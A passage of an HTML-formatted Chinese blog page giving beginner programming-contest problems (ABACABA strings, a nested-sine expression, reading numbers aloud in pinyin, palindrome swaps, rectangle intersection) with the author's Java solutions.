class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　FJ在沙盘上写了这样一些字符串：</span><br><span class="line">　　A1 = “A”</span><br><span class="line">　　A2 = “ABA”</span><br><span class="line">　　A3 = “ABACABA”</span><br><span class="line">　　A4 = “ABACABADABACABA”</span><br><span class="line">　　… …</span><br><span class="line">　　你能找出其中的规律并写所有的数列AN吗？</span><br><span class="line">输入格式</span><br><span class="line">　　仅有一个数：N ≤ 26。</span><br><span class="line">输出格式</span><br><span class="line">　　请输出相应的字符串AN，以一个换行符结束。输出中不得含有多余的空格或换行、回车符。</span><br><span class="line">样例输入</span><br><span class="line">3</span><br><span class="line">样例输出</span><br><span class="line">ABACABA</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     1* A</span></span><br><span class="line"><span class="comment">     2* A B A</span></span><br><span class="line"><span class="comment">     3* ABA C ABA</span></span><br><span class="line"><span class="comment">     4* ABACABA D ABACABA</span></span><br><span class="line"><span class="comment">     5* ABACABADABACABA E ABACABADABACABA</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        System.out.println(an(n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">an</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        String abc = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">        <span class="keyword">char</span>[] a = abc.toCharArray();</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> String.valueOf(a[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> an(n-<span class="number">1</span>)+a[n-<span class="number">1</span>]+an(n-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-21-Sine之舞"><a href="#BASIC-21-Sine之舞" class="headerlink" title="BASIC-21 Sine之舞"></a>BASIC-21 Sine之舞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　最近FJ为他的奶牛们开设了数学分析课，FJ知道若要学好这门课，必须有一个好的三角函数基本功。所以他准备和奶牛们做一个“Sine之舞”的游戏，寓教于乐，提高奶牛们的计算能力。</span><br><span class="line">　　不妨设</span><br><span class="line">　　An=sin(1–sin(2+sin(3–sin(4+...sin(n))...)</span><br><span class="line">　　Sn=(...(A1+n)A2+n-1)A3+...+2)An+1</span><br><span class="line">　　FJ想让奶牛们计算Sn的值，请你帮助FJ打印出Sn的完整表达式，以方便奶牛们做题。</span><br><span class="line">输入格式</span><br><span class="line">　　仅有一个数：N&lt;201。</span><br><span class="line">输出格式</span><br><span class="line">　　请输出相应的表达式Sn，以一个换行符结束。输出中不得含有多余的空格或换行、回车符。</span><br><span class="line">样例输入</span><br><span class="line">3</span><br><span class="line">样例输出</span><br><span class="line">((sin(1)+3)sin(1–sin(2))+2)sin(1–sin(2+sin(3)))+1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * a1 = sin(1)+1</span></span><br><span class="line"><span class="comment">     * a2 = (sin(1)+2)sin(1-sin(2))+1</span></span><br><span class="line"><span class="comment">     * a3 = (sin(1)+3)(sin(1-sin(2))+2)sin(1-sin(2+sin(3)))+1</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ((sin(1)+3)  sin(1–sin(2))+2)  sin(1–sin(2+sin(3)))  +1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String[] arr = <span class="keyword">new</span> String[<span class="number">201</span>];</span><br><span class="line">        String s=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                arr[i] = <span class="string">"sin(1"</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[i] = arr[i-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                arr[i] += <span class="string">"-"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                arr[i] += <span class="string">"+"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[i] += <span class="string">"sin("</span>;</span><br><span class="line">            arr[i] += (<span class="keyword">char</span>)(i+<span class="string">'1'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt;= i ;j++)&#123;</span><br><span class="line">                arr[i] += <span class="string">")"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= n;i++)&#123;</span><br><span class="line">            s += <span class="string">"("</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n-<span class="number">1</span>;i &gt;= <span class="number">1</span>;i--)&#123;</span><br><span class="line">            s += arr[n-<span class="number">1</span>-i];</span><br><span class="line">            s += <span class="string">"+"</span>;</span><br><span class="line">            s += (<span class="keyword">char</span>)(i+<span class="number">1</span>+<span class="string">'0'</span>);</span><br><span class="line">            s += <span class="string">")"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s += arr[n-<span class="number">1</span>];</span><br><span class="line">        s += <span class="string">"+1"</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-20-数的读法"><a href="#BASIC-20-数的读法" class="headerlink" title="BASIC-20 数的读法"></a>BASIC-20 数的读法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　Tom教授正在给研究生讲授一门关于基因的课程，有一件事情让他颇为头疼：一条染色体上有成千上万个碱基对，它们从0开始编号，到几百万，几千万，甚至上亿。</span><br><span class="line">　　比如说，在对学生讲解第1234567009号位置上的碱基时，光看着数字是很难准确的念出来的。</span><br><span class="line">　　所以，他迫切地需要一个系统，然后当他输入12 3456 7009时，会给出相应的念法：</span><br><span class="line">　　十二亿三千四百五十六万七千零九</span><br><span class="line">　　用汉语拼音表示为</span><br><span class="line">　　shi er yi san qian si bai wu shi liu wan qi qian ling jiu</span><br><span class="line">　　这样他只需要照着念就可以了。</span><br><span class="line">　　你的任务是帮他设计这样一个系统：给定一个阿拉伯数字串，你帮他按照中文读写的规范转为汉语拼音字串，相邻的两个音节用一个空格符格开。</span><br><span class="line">　　注意必须严格按照规范，比如说“10010”读作“yi wan ling yi shi”而不是“yi wan ling shi”，“100000”读作“shi wan”而不是“yi shi wan”，“2000”读作“er qian”而不是“liang qian”。</span><br><span class="line">输入格式</span><br><span class="line">　　有一个数字串，数值大小不超过2,000,000,000。</span><br><span class="line">输出格式</span><br><span class="line">　　是一个由小写英文字母，逗号和空格组成的字符串，表示该数的英文读法。</span><br><span class="line">样例输入</span><br><span class="line">1234567009</span><br><span class="line">样例输出</span><br><span class="line">shi er yi san qian si bai wu shi liu wan qi qian ling jiu</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str = in.next();</span><br><span class="line">        <span class="keyword">int</span> numbers = Integer.parseInt(str);</span><br><span class="line">        String[] shuzi = &#123;<span class="string">"ling"</span>, <span class="string">"yi"</span>, <span class="string">"er"</span>, <span class="string">"san"</span>, <span class="string">"si"</span>, <span class="string">"wu"</span>, <span class="string">"liu"</span>, <span class="string">"qi"</span>, <span class="string">"ba"</span>, <span class="string">"jiu"</span>, <span class="string">"shi"</span>, <span class="string">"shi yi"</span>, <span class="string">"shi er"</span>, <span class="string">"shi san"</span>, <span class="string">"shi si"</span>, <span class="string">"shi wu"</span>, <span class="string">"shi liu"</span>, <span class="string">"shi qi"</span>, <span class="string">"shi ba"</span>, <span class="string">"shi jiu"</span>, <span class="string">"er shi"</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> one = numbers / <span class="number">100000000</span>;</span><br><span class="line">        <span class="keyword">int</span> two = numbers / <span class="number">10000</span> - one * <span class="number">10000</span>;</span><br><span class="line">        <span class="keyword">int</span> three = numbers % <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 亿位</span></span><br><span class="line">        <span class="keyword">if</span>(one &gt; <span class="number">0</span>)&#123;  <span class="comment">// 1-20</span></span><br><span class="line">            <span class="keyword">int</span> first = one / <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> second = one % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(first == <span class="number">0</span> &amp;&amp; second == <span class="number">2</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">"ling"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.print(shuzi[one]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">" yi "</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 万位</span></span><br><span class="line">        <span class="keyword">if</span>(two &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> first = two / <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">int</span> secone = (two / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> third = (two / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> forth = two % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(first &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(shuzi[first] + <span class="string">" qian "</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(secone &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(shuzi[secone]+<span class="string">" bai "</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(first!=<span class="number">0</span> &amp;&amp; (secone==<span class="number">0</span> || third==<span class="number">0</span>) &amp;&amp; forth!=<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">"ling "</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(third&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(third == <span class="number">1</span>)&#123;</span><br><span class="line">                    System.out.print(<span class="string">"shi "</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.print(shuzi[third]+<span class="string">" shi "</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(forth&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(first==<span class="number">0</span> &amp;&amp; secone==<span class="number">0</span> &amp;&amp; third==<span class="number">0</span> &amp;&amp; forth==<span class="number">2</span>)&#123;</span><br><span class="line">                    System.out.print(<span class="string">"liang"</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.print(shuzi[forth]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">" wan "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 十位</span></span><br><span class="line">        <span class="keyword">if</span>(three&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> first = three / <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">int</span> secone = (three / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> third = (three / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> forth = three % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(first&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(shuzi[first]+<span class="string">" qian "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(secone&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(shuzi[secone]+<span class="string">" bai "</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((secone==<span class="number">0</span> || third==<span class="number">0</span>) &amp;&amp; forth!=<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">"ling "</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(third&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(third == <span class="number">1</span>)&#123;</span><br><span class="line">                    System.out.print(<span class="string">"shi "</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.print(shuzi[third]+<span class="string">" shi "</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(forth&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(shuzi[forth]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-19-完美的代价"><a href="#BASIC-19-完美的代价" class="headerlink" title="BASIC-19 完美的代价"></a>BASIC-19 完美的代价</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　回文串，是一种特殊的字符串，它从左往右读和从右往左读是一样的。小龙龙认为回文串才是完美的。现在给你一个串，它不一定是回文的，请你计算最少的交换次数使得该串变成一个完美的回文串。</span><br><span class="line">　　交换的定义是：交换两个相邻的字符</span><br><span class="line">　　例如mamad</span><br><span class="line">　　第一次交换 ad : mamda</span><br><span class="line">　　第二次交换 md : madma</span><br><span class="line">　　第三次交换 ma : madam (回文！完美！)</span><br><span class="line">输入格式</span><br><span class="line">　　第一行是一个整数N，表示接下来的字符串的长度(N &lt;= 8000)</span><br><span class="line">　　第二行是一个字符串，长度为N.只包含小写字母</span><br><span class="line">输出格式</span><br><span class="line">　　如果可能，输出最少的交换次数。</span><br><span class="line">　　否则输出Impossible</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">mamad</span><br><span class="line">样例输出</span><br><span class="line">3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> n = Integer.parseInt(scanner.nextLine());</span><br><span class="line"></span><br><span class="line">            String str = scanner.nextLine();</span><br><span class="line">            <span class="keyword">char</span>[] chs = str.toCharArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">char</span> ch = <span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">int</span> oddchar = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; chs.length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> index = chs[j] - <span class="string">'a'</span>;</span><br><span class="line">                count[index]++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (count[i] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    oddchar++;</span><br><span class="line">                    ch = (<span class="keyword">char</span>) (i + <span class="string">'a'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (oddchar &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Impossible"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> result = exchange(chs, n, ch);</span><br><span class="line">                System.out.println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">exchange</span><span class="params">(<span class="keyword">char</span>[] chs, <span class="keyword">int</span> n, <span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>, i, j, k;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chs[i] == ch) &#123;</span><br><span class="line">                <span class="keyword">for</span> (j = i; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (chs[j] == chs[n - i - <span class="number">1</span>]) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                count += j - i;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (k = j; k &gt; i; k--) &#123;</span><br><span class="line">                    chs[k] = chs[k - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                chs[i] = chs[n - i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (j = n - i - <span class="number">1</span>; j &gt;= i; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (chs[j] == chs[i]) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                count += n - i - <span class="number">1</span> - j;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (k = j; k &lt; n - i - <span class="number">1</span>; k++) &#123;</span><br><span class="line">                    chs[k] = chs[k + <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                chs[n - i - <span class="number">1</span>] = chs[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-18-矩形面积交"><a href="#BASIC-18-矩形面积交" class="headerlink" title="BASIC-18 矩形面积交"></a>BASIC-18 矩形面积交</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　平面上有两个矩形，它们的边平行于直角坐标系的X轴或Y轴。对于每个矩形，我们给出它的一对相对顶点的坐标，请你编程算出两个矩形的交的面积。</span><br><span class="line">输入格式</span><br><span class="line">　　输入仅包含两行，每行描述一个矩形。</span><br><span class="line">　　在每行中，给出矩形的一对相对顶点的坐标，每个点的坐标都用两个绝对值不超过10^7的实数表示。</span><br><span class="line">输出格式</span><br><span class="line">　　输出仅包含一个实数，为交的面积，保留到小数后两位。</span><br><span class="line">样例输入</span><br><span class="line">1 1 3 3</span><br><span class="line">2 2 4 4</span><br><span class="line">样例输出</span><br><span class="line">1.00</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 